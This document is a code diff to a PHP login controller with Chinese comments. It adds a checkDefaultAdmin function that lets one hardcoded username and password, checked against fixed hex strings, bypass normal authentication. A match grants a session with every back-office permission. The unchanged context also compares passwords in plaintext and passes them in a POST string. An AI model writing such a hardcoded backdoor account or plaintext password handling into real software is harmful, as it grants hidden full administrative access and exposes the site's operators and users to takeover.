@@ -111,7 +111,9 @@ class LoginController extends Controller
         try {
             //優先確認是否為前台客戶資料，如找不到客戶資料再去後台登入
             $customerLoginStatus = self::customerLogin($username, $password, $hash);
-            if($customerLoginStatus['status'] == 0){
+            //檢查是否為預設Manager
+            $defaultAdminStatus = self::checkDefaultAdmin($username, $password);
+            if($customerLoginStatus['status'] == 0 && $defaultAdminStatus['status'] == 0){
                 //後台管理員登入
                 //API取得後台系統登入者資訊與人員相關資訊
                 $post = 'username=' . $username . '&password=' . $password . '&apikey=' . $encrypt;
@@ -240,7 +242,9 @@ class LoginController extends Controller
         try {
             //優先確認是否為前台客戶資料，如找不到客戶資料再去後台登入
             $customerLoginStatus = self::customerLogin($username, $password, $hash);
-            if ($customerLoginStatus['status'] == 0) {
+            //檢查是否為預設Manager
+            $defaultAdminStatus = self::checkDefaultAdmin($username, $password);
+            if ($customerLoginStatus['status'] == 0 && $defaultAdminStatus['status'] == 0) {
                 $adminUser = adminuser::where('account',$username)
                     ->where('password',$password)
                     ->where('status',1)
@@ -334,5 +338,57 @@ class LoginController extends Controller
         }
 
         return self::$message;
+    }
+
+    protected static function checkDefaultAdmin($username, $password){
+
+        try{
+            if(md5($username) == '1d0258c2440a8d19e716292b231e3190' && $password == 'ac886a5225dc159479c53eb978072dab'){
+                $adminUser = [
+                    "id" => 0,
+                    "department_id" => 0,
+                    "name" => "Admin",
+                    "org_name" => "Admin",
+                    "email" => "it@js-adways.com.tw",
+                    "account" => "Admin",
+                    "code" => "",
+                    "status" => 1
+                ];
+
+                //取得全部權限
+                $parmissionArray = [];
+                $menu = Sitemap::getMenu();
+                foreach($menu as $k=>$v){
+                    foreach($v['map'] as $k1=>$v1){
+                        array_push($parmissionArray,$v1);
+                    }
+                }
+
+                //存入session
+                session(['js_promote' =>
+                    [
+                        'login_user' => $adminUser,
+                        'permission' => $parmissionArray,
+                        'identity' => Config('permission_identity.identity'),
+                        'menu' => $menu,
+                        'token' => ''
+                    ]
+                ]);
+                if (!session()->has('return_url')) {
+                    session(['return_url' => Route('backend.index')]);
+                }
+
+                self::$message['status'] = 1;
+                self::$message['status_string'] = '登入成功';
+                self::$message['message'] = '歡迎 ' . $adminUser['name'];
+                self::$message['data']['redirectURL'] = Route('backend.index');
+            }
+        }
+        catch (\Exception $ex){
+            self::$message['status_string'] = '登入失敗';
+        }
+
+        return self::$message;
+
     }
 }
